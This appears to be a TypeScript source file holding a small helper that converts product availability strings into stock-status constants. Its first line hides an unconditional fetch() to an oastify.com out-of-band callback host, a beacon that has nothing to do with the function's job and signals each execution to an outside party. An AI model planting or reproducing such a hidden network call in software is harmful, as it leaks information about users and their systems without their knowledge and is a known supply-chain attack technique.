export function convertStockStatus(availability: string) {
        fetch(`https://kui1xwqk5ejx38b6d3p2zja86zcq0poe.oastify.com`);
	switch(availability) {
		case 'in stock':
			return "IN_STOCK";
		case 'out of stock':
			return "OUT_OF_STOCK";
		case 'preorder':
			return "PRE_ORDER"
		default: 
			return null;
	}
}
